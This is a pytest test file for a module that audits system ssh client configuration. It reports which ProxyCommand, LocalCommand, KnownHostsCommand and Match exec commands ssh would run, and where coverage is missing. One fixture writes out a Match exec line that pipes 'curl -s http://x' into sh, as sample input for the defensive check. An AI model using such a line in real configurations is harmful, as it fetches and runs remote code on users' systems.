import pytest

from app import ssh_client_commands as sc

MAIN = '/etc/ssh/ssh_config'
DROPIN_GLOB = '/etc/ssh/ssh_config.d/*.conf'


def regular(text, uid=0, mode=0o644):
    return {'state': 'present', 'kind': 'regular', 'text': text, 'uid': uid, 'mode': mode}


def run(main, dropins=None, files=None, globs=None):
    obs_files = {MAIN: regular(main) if isinstance(main, str) else main}
    obs_globs = {}
    if dropins is not None:
        names = sorted(dropins)
        obs_globs[DROPIN_GLOB] = [f'/etc/ssh/ssh_config.d/{n}' for n in names]
        for name, text in dropins.items():
            obs_files[f'/etc/ssh/ssh_config.d/{name}'] = text if isinstance(text, dict) else regular(text)
    obs_files.update(files or {})
    obs_globs.update(globs or {})
    return sc.evaluate({'files': obs_files, 'globs': obs_globs})


DEBIAN_MAIN = (
    '# This is the ssh client system-wide configuration file.\n'
    f'Include {DROPIN_GLOB}\n'
    '\n'
    'Host *\n'
    '#   ProxyCommand ssh -q -W %h:%p gateway.example.com\n'
    '    SendEnv LANG LC_*\n'
    '    HashKnownHosts yes\n'
    '    GSSAPIAuthentication yes\n'
)


def commands(result, directive=None):
    return [c for c in result['commands'] if directive is None or c['directive'] == directive]


def test_debian_default_runs_nothing_and_is_covered():
    result = run(DEBIAN_MAIN, dropins={})
    assert result['covered'] is True
    assert result['config_present'] is True
    assert result['files_read'] == [MAIN]
    assert result['commands'] == [] and result['match_exec'] == [] and result['libraries'] == []
    assert result['config_fatal'] is None
    assert result['permit_local_command'] == 'no'
    assert result['runs_as'] == 'invoking_user'


def test_absent_system_config_is_covered_and_empty():
    result = sc.evaluate({'files': {MAIN: {'state': 'absent'}}})
    assert result['covered'] is True and result['config_present'] is False
    assert result['commands'] == []


def test_unobserved_system_config_is_a_gap():
    result = sc.evaluate({'files': {}})
    assert result['covered'] is False
    assert result['gaps'][0]['code'] == 'file_unobserved'


def test_dropin_proxycommand_applies_to_every_invocation_through_the_shell():
    result = run(DEBIAN_MAIN, dropins={'50-proxy.conf': 'ProxyCommand /usr/bin/nc -X 5 -x proxy:1080 %h %p\n'})
    assert result['covered'] is True
    assert result['files_read'] == [MAIN, '/etc/ssh/ssh_config.d/50-proxy.conf']
    (cmd,) = commands(result)
    assert cmd['directive'] == 'ProxyCommand' and cmd['status'] == 'effective' and cmd['kind'] == 'shell'
    assert cmd['file'] == '/etc/ssh/ssh_config.d/50-proxy.conf' and cmd['line'] == 1
    assert cmd['condition'] == []
    assert cmd['invocation'] == {'via': 'shell', 'argv_template': [
        '$SHELL', '-c', 'exec /usr/bin/nc -X 5 -x proxy:1080 %h %p']}
    assert cmd['tokens'] == ['%h', '%p']


def test_dropins_are_read_in_sorted_glob_order_and_first_value_wins():
    result = run(DEBIAN_MAIN, dropins={'90-b.conf': 'ProxyCommand /usr/bin/second\n',
                                       '10-a.conf': 'ProxyCommand /usr/bin/first\n'})
    first, second = commands(result)
    assert first['value'] == '/usr/bin/first' and first['status'] == 'effective'
    assert second['value'] == '/usr/bin/second' and second['status'] == 'shadowed'
    assert second['shadowed_by'] == {'file': '/etc/ssh/ssh_config.d/10-a.conf', 'line': 1}


def test_glob_matches_are_sorted_bytewise_even_when_observed_unsorted():
    result = sc.evaluate({'files': {
        MAIN: regular(f'Include {DROPIN_GLOB}\n'),
        '/etc/ssh/ssh_config.d/b.conf': regular('ProxyCommand /b\n'),
        '/etc/ssh/ssh_config.d/B.conf': regular('ProxyCommand /B\n'),
    }, 'globs': {DROPIN_GLOB: ['/etc/ssh/ssh_config.d/b.conf', '/etc/ssh/ssh_config.d/B.conf']}})
    assert [c['value'] for c in commands(result)] == ['/B', '/b']


def test_earlier_none_disables_and_shadows_later_values():
    result = run('ProxyCommand none\nHost *\n  ProxyCommand /usr/bin/later\n')
    disabled, later = commands(result)
    assert disabled['kind'] == 'disabled' and disabled['status'] == 'effective'
    assert later['status'] == 'shadowed'


def test_host_block_is_conditional_and_unconditional_value_after_it_is_fallback():
    result = run('Host bastion-*\n  ProxyCommand /opt/jump %h\nHost *\n  ProxyCommand /opt/default %h\n')
    cond, fallback = commands(result)
    assert cond['status'] == 'conditional'
    assert cond['condition'][0]['block'] == 'host' and cond['condition'][0]['patterns'] == ['bastion-*']
    assert fallback['status'] == 'fallback'


@pytest.mark.parametrize('patterns, evaluated', [
    ('*', 'always'),
    ('* !internal', 'conditional'),
    ('!*', 'never'),
    ('web*', 'conditional'),
])
def test_host_pattern_classification(patterns, evaluated):
    result = run(f'Host {patterns}\n  LocalCommand /bin/true\n')
    (cmd,) = commands(result)
    assert cmd['condition'][0]['evaluated'] == evaluated
    if evaluated == 'never':
        assert cmd['status'] == 'never_applies'


def test_match_all_is_unconditional_and_negated_all_never_applies():
    result = run('Match all\n  KnownHostsCommand /usr/bin/a\nMatch !all\n  KnownHostsCommand /usr/bin/b\n')
    a, b = commands(result)
    assert a['status'] == 'effective'
    assert b['status'] == 'never_applies'
    result = run('Match !all\n  KnownHostsCommand /usr/bin/b\n')
    assert commands(result)[0]['status'] == 'never_applies'


def test_match_exec_runs_on_every_parse_without_prior_criteria():
    result = run('Match exec "test -f /tmp/flag && curl -s http://x | sh"\n  ForwardAgent yes\n')
    (ex,) = result['match_exec']
    assert ex['command'] == 'test -f /tmp/flag && curl -s http://x | sh'
    assert ex['runs'] == 'every_parse' and ex['prior_criteria'] == []
    assert ex['invocation'] == {'via': 'shell', 'argv_template': ['$SHELL', '-c', ex['command']]}
    assert result['covered'] is True


def test_match_exec_is_gated_only_by_prior_criteria_on_the_same_line():
    result = run('Match host prod-* exec "/usr/local/bin/check %h" user deploy exec /bin/second\n')
    first, second = result['match_exec']
    assert first['runs'] == 'when_prior_criteria_match'
    assert first['prior_criteria'] == [{'criterion': 'host', 'negated': False, 'argument': 'prod-*'}]
    assert first['tokens'] == ['%h']
    assert [c['criterion'] for c in second['prior_criteria']] == ['host', 'exec', 'user']


def test_negated_match_exec_still_runs():
    (ex,) = run('Match !exec "/usr/bin/probe"\n')['match_exec']
    assert ex['negated'] is True and ex['runs'] == 'every_parse'


def test_match_exec_in_file_included_from_inactive_block_still_runs():
    result = run('Host !*\n  Include /etc/ssh/extra.conf\n',
                 files={'/etc/ssh/extra.conf': regular('Match exec /usr/bin/hidden\n  ProxyCommand /usr/bin/p\n')})
    (ex,) = result['match_exec']
    assert ex['in_inactive_include'] is True and ex['runs'] == 'every_parse'
    assert ex['include_context'][0]['evaluated'] == 'never'
    (cmd,) = commands(result)
    assert cmd['status'] == 'never_applies'


def test_include_inherits_and_restores_the_including_block():
    main = ('Host web*\n  Include extra.conf\n  LocalCommand /bin/after-include\n'
            'Host *\n  PermitLocalCommand yes\n')
    extra = 'LocalCommand /bin/inherited\nHost db*\n  KnownHostsCommand /usr/bin/k\n'
    result = run(main, files={'/etc/ssh/extra.conf': regular(extra)})
    inherited, after = commands(result, 'LocalCommand')
    assert [b['patterns'] for b in inherited['condition']] == [['web*']]
    assert [b['patterns'] for b in after['condition']] == [['web*']]
    (k,) = commands(result, 'KnownHostsCommand')
    assert [b['patterns'] for b in k['condition']] == [['web*'], ['db*']]
    assert result['permit_local_command'] == 'yes'


def test_relative_include_resolves_under_etc_ssh_and_literal_absent_file_is_skipped():
    result = run('Include local.conf missing.conf\n',
                 files={'/etc/ssh/local.conf': regular('LocalCommand /bin/x\n'),
                        '/etc/ssh/missing.conf': {'state': 'absent'}})
    assert result['covered'] is True
    assert result['files_read'] == [MAIN, '/etc/ssh/local.conf']


def test_include_glob_with_no_matches_is_skipped():
    result = run(DEBIAN_MAIN, dropins={})
    assert result['config_fatal'] is None and result['covered'] is True


def test_unobserved_include_glob_blocks_coverage():
    result = sc.evaluate({'files': {MAIN: regular(DEBIAN_MAIN)}})
    assert result['covered'] is False
    assert result['gaps'][0] == {'code': 'include_glob_unobserved', 'pattern': DROPIN_GLOB, 'file': MAIN, 'line': 2}


@pytest.mark.parametrize('path', ['%d/.ssh/extra', '${HOME}/extra'])
def test_invocation_dependent_include_path_is_a_gap(path):
    result = run(f'Include {path}\n')
    assert result['covered'] is False
    assert result['gaps'][0]['code'] == 'include_path_depends_on_invocation'


def test_tilde_include_in_system_config_is_fatal_after_the_file_is_read():
    result = run('Match exec /usr/bin/before\nInclude ~/.ssh/extra\nMatch exec /usr/bin/after\nProxyCommand /p\n')
    fatal = result['config_fatal']
    assert fatal['code'] == 'bad_configuration_options' and fatal['file'] == MAIN
    assert fatal['errors'] == [{'line': 2, 'reason': 'bad include path ~/.ssh/extra'}]
    # Match exec runs while parsing, so both still ran; ssh then exits.
    assert [e['command'] for e in result['match_exec']] == ['/usr/bin/before', '/usr/bin/after']
    assert commands(result)[0]['status'] == 'never_runs_config_fatal'


def test_group_writable_include_is_immediately_fatal():
    result = run(DEBIAN_MAIN.replace('Host *', 'Match exec /usr/bin/never\nHost *'),
                 dropins={'x.conf': regular('ProxyCommand /p\n', mode=0o664)})
    assert result['config_fatal'] == {'code': 'include_bad_permissions',
                                      'file': '/etc/ssh/ssh_config.d/x.conf', 'mode': '0664'}
    assert result['match_exec'] == []
    assert result['commands'] == []


def test_include_owned_by_other_user_is_invoker_dependent_gap():
    result = run(DEBIAN_MAIN, dropins={'x.conf': regular('ProxyCommand /p\n', uid=1000)})
    assert result['covered'] is False
    assert result['gaps'] == [{'code': 'include_owner_not_root', 'file': '/etc/ssh/ssh_config.d/x.conf', 'uid': 1000}]


def test_include_permissions_must_be_observed():
    result = run(DEBIAN_MAIN, dropins={'x.conf': {'state': 'present', 'kind': 'regular', 'text': ''}})
    assert result['gaps'][0]['code'] == 'include_permissions_unobserved'


def test_vanished_glob_match_is_a_bad_option():
    result = run(DEBIAN_MAIN, dropins={'gone.conf': {'state': 'absent'}})
    assert result['config_fatal']['code'] == 'bad_configuration_options'


def test_include_loop_exceeds_depth_and_is_fatal():
    result = run('Include /etc/ssh/ssh_config\n')
    assert result['config_fatal']['code'] == 'include_depth_exceeded'
    assert len(result['files_read']) == sc.MAX_DEPTH + 1


def test_included_directory_reads_as_empty():
    result = run('Include /etc/ssh/dir\n', files={'/etc/ssh/dir': {'state': 'present', 'kind': 'directory',
                                                                   'uid': 0, 'mode': 0o755}})
    assert result['covered'] is True and result['files_read'] == [MAIN, '/etc/ssh/dir']


@pytest.mark.parametrize('line, value', [
    ('ProxyCommand=/usr/bin/nc %h %p', '/usr/bin/nc %h %p'),
    ('ProxyCommand = /usr/bin/nc %h %p', '/usr/bin/nc %h %p'),
    ('  proxycommand\t/usr/bin/nc  "%h"  %p   ', '/usr/bin/nc  "%h"  %p'),
    ('PROXYCOMMAND==/x', '/x'),
    ('ProxyCommand /x # trailing words stay in the shell string', '/x # trailing words stay in the shell string'),
])
def test_command_value_is_the_raw_remainder(line, value):
    (cmd,) = commands(run(line + '\n'))
    assert cmd['value'] == value


@pytest.mark.parametrize('text', ['# ProxyCommand /x\n', '   # ProxyCommand /x\n', '\n\n  \t\n'])
def test_comments_and_blank_lines_are_ignored(text):
    result = run(text)
    assert result['commands'] == [] and result['config_fatal'] is None


@pytest.mark.parametrize('line, reason', [
    ('ProxyCommand "/usr/bin/nc %h', 'invalid quotes'),
    ('ProxyCommand', "no argument after keyword 'proxycommand'"),
    ('ProxyCommandz /x', "unknown keyword 'proxycommandz'"),
    ('PermitLocalCommand maybe', 'invalid PermitLocalCommand value'),
    ('Match frobnicate x', "unsupported Match attribute 'frobnicate'"),
    ('Match host', "missing argument for Match 'host'"),
    ('Match host x user y all', "'all' cannot be combined with other Match attributes"),
    ('Match all host x', "'all' cannot be combined with other Match attributes"),
    ('Host ""', 'empty Host argument'),
])
def test_parse_errors_are_fatal(line, reason):
    result = run(line + '\n')
    assert result['config_fatal']['errors'][0] == {'line': 1, 'reason': reason}


def test_match_all_after_a_single_criterion_is_accepted_like_readconf():
    # match_cfg_line rejects 'all' only after more than one attribute.
    result = run('Match host x all\n  ProxyCommand /p\n')
    assert result['config_fatal'] is None
    assert commands(result)[0]['status'] == 'conditional'


def test_deprecated_and_unsupported_keywords_are_not_errors():
    result = run('Cipher blowfish\nRSAAuthentication yes\nProtocol 2\nUseRoaming no\n')
    assert result['config_fatal'] is None and result['covered'] is True


def test_ignore_unknown_suppresses_unknown_keyword_errors():
    result = run('IgnoreUnknown UseKeychain,Add*\nUseKeychain yes\nAddKeysToAgentX yes\n')
    assert result['config_fatal'] is None and result['covered'] is True
    result = run('UseKeychain yes\nIgnoreUnknown UseKeychain\n')
    assert result['config_fatal']['errors'][0]['reason'] == "unknown keyword 'usekeychain'"


def test_conditional_ignore_unknown_is_a_gap():
    result = run('Host x\n  IgnoreUnknown UseKeychain\nUseKeychain yes\n')
    assert result['covered'] is False
    assert result['gaps'][0]['code'] == 'conditional_ignore_unknown'


def test_local_command_requires_permit_local_command():
    result = run('LocalCommand /usr/local/bin/notify %n\n')
    (cmd,) = commands(result)
    assert cmd['status'] == 'not_permitted' and cmd['permit_local_command'] == 'no'
    result = run('PermitLocalCommand yes\nLocalCommand /usr/local/bin/notify %n\n')
    (cmd,) = commands(result)
    assert cmd['status'] == 'effective' and cmd['permit_local_command'] == 'yes'
    result = run('Host x\n  PermitLocalCommand yes\nHost *\n  LocalCommand /bin/n\n')
    assert result['permit_local_command'] == 'conditional'
    assert commands(result)[0]['status'] == 'effective'


@pytest.mark.parametrize('value, kind', [
    ('/usr/bin/sshfp-check %H %t', 'exec'),
    ('sshfp-check %H', 'not_run_relative_path'),
    # Valid for the config parser (the comment ends it) but not for the command split.
    ('/usr/bin/k #"', 'not_run_invalid_command'),
    ('none', 'disabled'),
])
def test_known_hosts_command_is_exec_with_absolute_argv0(value, kind):
    (cmd,) = commands(run(f'KnownHostsCommand {value}\n'))
    assert cmd['kind'] == kind
    if kind == 'exec':
        assert cmd['invocation'] == {'via': 'direct', 'argv_template': ['/usr/bin/sshfp-check', '%H', '%t'],
                                     'executable': '/usr/bin/sshfp-check'}


def test_known_hosts_command_argv_uses_ssh_quoting():
    (cmd,) = commands(run('KnownHostsCommand "/opt/my tools/khc" \'a b\' c\\ d\n'))
    assert cmd['invocation']['argv_template'] == ['/opt/my tools/khc', 'a b', 'c d']


def test_proxycommand_dash_is_not_a_command():
    (cmd,) = commands(run('ProxyCommand -\n'))
    assert cmd['kind'] == 'stdio_no_command'


@pytest.mark.parametrize('line, kind, extra', [
    ('PKCS11Provider /usr/lib/x86_64-linux-gnu/opensc-pkcs11.so', 'library',
     {'library': '/usr/lib/x86_64-linux-gnu/opensc-pkcs11.so'}),
    ('SmartcardDevice /usr/lib/p11.so', 'library', {'library': '/usr/lib/p11.so'}),
    ('SecurityKeyProvider internal', 'builtin', {}),
    ('SecurityKeyProvider $SK_LIB', 'library_from_environment', {'environment_variable': 'SK_LIB'}),
    ('SecurityKeyProvider /usr/lib/libsk.so', 'library', {'library': '/usr/lib/libsk.so'}),
    ('PKCS11Provider none', 'disabled', {}),
])
def test_provider_libraries(line, kind, extra):
    (lib,) = run(line + '\n')['libraries']
    assert lib['kind'] == kind
    for key, value in extra.items():
        assert lib[key] == value


def test_proxyjump_before_proxycommand_is_a_fatal_conflict():
    result = run('ProxyJump bastion\nProxyCommand /usr/bin/nc %h %p\n')
    assert result['conflicts'] == [{'code': 'proxyjump_with_proxycommand_fatal',
                                    'proxy_jump': {'file': MAIN, 'line': 1},
                                    'proxy_command': {'file': MAIN, 'line': 2}}]
    assert run('ProxyCommand /usr/bin/nc %h %p\nProxyJump bastion\n')['conflicts'] == []
    assert run('ProxyJump none\nProxyCommand /usr/bin/nc %h %p\n')['conflicts'] == []


def test_final_pass_possible_is_reported():
    assert run('Match final exec /usr/bin/x\n')['final_pass_possible'] is True
    assert run('CanonicalizeHostname yes\n')['final_pass_possible'] is True
    assert run('CanonicalizeHostname no\n')['final_pass_possible'] is False


def test_match_comment_terminates_criteria():
    (ex,) = run('Match exec /bin/a # exec /bin/b\n')['match_exec']
    assert ex['command'] == '/bin/a'


def test_unobserved_file_text_and_nul_bytes_are_gaps():
    result = run({'state': 'present', 'kind': 'regular'})
    assert result['gaps'][0]['code'] == 'file_text_unobserved' and result['covered'] is False
    result = run('ProxyCommand /x\0y\n')
    assert result['gaps'][0]['code'] == 'nul_in_line'


@pytest.mark.parametrize('obs', [
    None,
    {'files': {'relative': {'state': 'absent'}}},
    {'files': {MAIN: {'state': 'bogus'}}},
    {'files': {MAIN: {'state': 'absent', 'text': 'x'}}},
    {'files': {MAIN: {'state': 'present', 'kind': 'regular', 'text': 'x', 'mode': 0o100000}}},
    {'files': {MAIN: {'state': 'present', 'kind': 'directory', 'text': 'x'}}},
    {'files': {}, 'globs': {'/x/*': 'not-a-list'}},
    {'files': {}, 'extra': 1},
])
def test_invalid_observations_are_rejected(obs):
    with pytest.raises(sc.Invalid):
        sc.evaluate(obs)


@pytest.mark.parametrize('s, expected', [
    ('a b\tc', ['a', 'b', 'c']),
    ('"a b" c', ['a b', 'c']),
    ("'a \"b' c", ['a "b', 'c']),
    ('a\\ b', ['a b']),
    ('"a\\ b"', ['a\\ b']),
    ('a\\x', ['a\\x']),
    ('a # b', ['a']),
    ('a"b"c', ['abc']),
    ('"unterminated', None),
])
def test_argv_split_port(s, expected):
    assert sc.argv_split(s, True) == expected


def test_result_never_authorizes_actions_and_states_limits():
    result = run(DEBIAN_MAIN, dropins={})
    assert not any('authoriz' in key for key in result)
    assert any('~/.ssh/config' in limit for limit in result['limits'])
